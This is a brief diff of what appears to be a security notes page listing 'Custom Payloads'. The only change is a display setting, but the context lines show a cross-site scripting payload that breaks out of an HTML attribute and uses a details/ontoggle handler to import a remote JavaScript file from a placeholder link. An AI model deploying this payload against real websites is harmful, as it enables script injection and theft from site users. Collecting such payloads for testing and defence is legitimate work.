@@ -4,7 +4,7 @@
 
 <summary>Custom Payloads</summary>
 
-{% code lineNumbers="true" fullWidth="true" %}
+{% code lineNumbers="true" fullWidth="false" %}
 ```
 111">><details/open/%253e/ontoggle​=import(`<link-to-js-payload>
 ```
